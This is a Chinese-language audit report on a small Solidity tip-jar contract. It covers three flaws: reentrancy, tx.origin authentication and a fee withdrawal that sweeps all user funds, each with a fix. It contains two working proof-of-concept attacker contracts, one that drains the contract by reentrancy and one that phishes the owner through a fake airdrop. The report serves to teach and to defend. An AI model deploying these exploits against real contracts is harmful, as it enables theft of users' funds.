# TipJar 审计报告

| 项目 | 内容 |
|---|---|
| **目标合约** | [`targets/TipJar.sol`](../targets/TipJar.sol) |
| **审计日期** | 2026-10 |
| **审计方式** | 手动代码审计 + 攻击合约验证（PoC） |
| **漏洞总数** | **3**（高危 2 / 中危 1） |

---

## 摘要

| ID | 标题 | 严重性 | 位置 | 类型 |
|---|---|---|---|---|
| [TJ-01](#tj-01-先转账后扣账导致重入) | 先转账、后扣账导致重入 | 🔴 **High** | `cashOut()` L28 → L31 | 重入 |
| [TJ-02](#tj-02-使用-txorigin-判断身份遭钓鱼) | 使用 `tx.origin` 判断身份，遭钓鱼 | 🔴 **High** | `withdrawFees()` L36 | 访问控制 |
| [TJ-03](#tj-03-手续费提取动用合约全部余额) | 手续费提取动用合约**全部**余额 | 🟡 **Medium** | `withdrawFees()` L37 | 中心化风险 |

## 函数概览

| 函数 | 判定 |
|---|---|
| `tip()` | ✅ 干净 |
| `cashOut()` | 🔴 重入 |
| `withdrawFees()` | 🔴 `tx.origin` 钓鱼 + 🟡 可卷走用户资金 |

---

## TJ-01 先转账、后扣账导致重入

**位置** `cashOut()`，L28 → L31
**严重性** 🔴 High
**类型** Reentrancy

### 描述

`cashOut()` 的执行顺序是 **先转账、后扣账**：

```solidity
function cashOut() public {
    uint amount = tips[msg.sender];
    require(amount > 0, "nothing to cash out");

    (bool ok, ) = msg.sender.call{value: amount}("");   // L28  转账
    require(ok, "transfer failed");

    tips[msg.sender] = 0;                               // L31  改账
}
```

`.call{value:}` 会把**全部剩余 gas** 交给接收方，接收方可以在 `receive()` 里再次调用 `cashOut()`。此时 L31 还没执行，`tips[msg.sender]` 仍然是原值，`require(amount > 0)` 再次通过。

**账本在每一次递归里都读到同一个旧值**，循环直到合约余额被掏空。

### 攻击路径

```solidity
contract TipJarAttacker {
    TipJar public jar;
    constructor(address _jar) { jar = TipJar(_jar); }

    function attack() public payable {
        jar.tip{value: msg.value}();   // 存一点钱，取得领取资格
        jar.cashOut();                 // 第一次领取
    }

    receive() external payable {
        if (address(jar).balance >= 1 ether) {
            jar.cashOut();             // 每次收到钱就再领一次
        }
    }

    function collect() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

1. 攻击者存入 1 ETH
2. 调用 `cashOut()` → 合约转账 1 ETH → 触发攻击合约的 `receive()`
3. `receive()` 里再次调用 `cashOut()`，此时 `tips[attacker]` 仍是 1 ETH
4. 递归重复，直到合约余额不足 1 ETH
5. 攻击者调用 `collect()` 提走全部所得

> `receive()` 中的余额判断是必要的：若无脑重复调用，最后一次会因合约余额不足而转账失败，触发 `require(ok, "transfer failed")` 回滚整笔交易。

### 影响

**合约内所有用户的资金被全部提取。** 账本上其他用户的 `tips` 数字仍然存在，但合约已无钱可提 —— 形成**坏账（insolvency）**。

### 修复

**Checks → Effects → Interactions（CEI）：先扣账，再转账。**

```solidity
function cashOut() public {
    uint amount = tips[msg.sender];
    require(amount > 0, "nothing to cash out");

    tips[msg.sender] = 0;                               // 先扣账

    (bool ok, ) = msg.sender.call{value: amount}("");   // 再转账
    require(ok, "transfer failed");
}
```

修复后，第一次递归进入时 `tips[msg.sender]` 已经是 `0`，`require(amount > 0)` 直接拦下，攻击失效。

**补充说明**：也可以加 `nonReentrant` 重入锁，但 **CEI 是更根本的修法** —— 它不依赖额外的状态变量，也不会因为漏加 modifier 而失效。

---

## TJ-02 使用 `tx.origin` 判断身份遭钓鱼

**位置** `withdrawFees()`，L36
**严重性** 🔴 High
**类型** Access Control / Phishing

### 描述

```solidity
function withdrawFees() public {
    require(tx.origin == owner, "not owner");        // L36
    payable(msg.sender).transfer(address(this).balance);
}
```

| 变量 | 含义 |
|---|---|
| `tx.origin` | **整条调用链的起点**（最初点火的人） |
| `msg.sender` | **直接调用者**（敲门的人） |

`tx.origin` 检查的是「谁发起了这笔交易」，而不是「谁在调用这个函数」。**攻击者可以诱导 owner 亲自发起一笔交易，在这笔交易内部由攻击合约去调用 `withdrawFees()`。**

此时：
- `tx.origin` = owner → **检查通过**
- `msg.sender` = 攻击合约 → **钱转给了攻击合约**

### 攻击路径

```solidity
contract TipJarPhisher {
    TipJar public jar;
    constructor(address _jar) { jar = TipJar(_jar); }

    function fakeAirdrop() public {
        // 包装成「领取空投」，诱导 owner 点击
        jar.withdrawFees();
    }

    receive() external payable {}
}
```

1. 攻击者部署 `TipJarPhisher`，对外宣传「点击领取空投」
2. owner 点击 `fakeAirdrop()` —— 交易由 owner 发起
3. 合约内部调用 `jar.withdrawFees()`
4. `tx.origin == owner` ✅ 通过；资金转入攻击合约

**钓鱼的本质：真实的动作是你授权的，但你以为你在做 A，实际在做 B。**

### 影响

**owner 被诱导点击一次，合约资金全部转给攻击者。**

### 修复

```solidity
require(msg.sender == owner, "not owner");
```

> **硬规则：永远不要用 `tx.origin` 做身份判断，任何场景都只用 `msg.sender`，没有例外。**

---

## TJ-03 手续费提取动用合约全部余额

**位置** `withdrawFees()`，L37
**严重性** 🟡 Medium
**类型** 设计缺陷 / 中心化风险

### 描述

```solidity
payable(msg.sender).transfer(address(this).balance);   // L37
```

`address(this).balance` 是**合约里的全部资金**，但它被当作「手续费」提走了。

**账本不会同步更新** —— 钱被拿走了，`tips[user]` 的数字一个都没变。

### 影响

owner 可以反复调用 `withdrawFees()`，把用户存入的本金全部提走，而账本上仍显示用户有钱。**最后一个来取款的用户取不出钱 = 坏账。**

这**不是代码写错了，是设计有问题** —— 即使 `tx.origin` 修好了、owner 也是好人，这个函数依然允许「动用用户资金」。审计报告里把这类问题称为**中心化风险**。

### 修复

**给手续费一个独立的账本，与用户余额完全分离。**

```solidity
mapping(address => uint) public tips;
uint public fees;                       // 新增：手续费池

function tip() public payable {
    uint fee = msg.value / 100;
    tips[msg.sender] = tips[msg.sender] + msg.value - fee;
    fees = fees + fee;
}

function withdrawFees() public {
    require(msg.sender == owner, "not owner");
    uint amount = fees;
    fees = 0;                           // CEI：先扣账
    payable(owner).transfer(amount);    // 再转账
}
```

### 不变量

> **`address(this).balance == Σ tips[user] + fees`**

任何时刻这条不成立，就说明合约里有洞。这也是我在 [`contracts/Bank.sol`](../contracts/Bank.sol) 里采用的设计。

---

## 结论

`TipJar` 一共 **3 个问题**：2 个高危漏洞 + 1 个设计缺陷。

- 修复 TJ-01 只需**移动一行**（把 L31 挪到 L28 之前）
- 修复 TJ-02 只需**替换一个词**（`tx.origin` → `msg.sender`）
- 修复 TJ-03 需要**新增一个状态变量**并调整记账逻辑

**最危险的漏洞，修起来往往只要一行 —— 但找出来需要理解「假设在哪里被打破了」。**
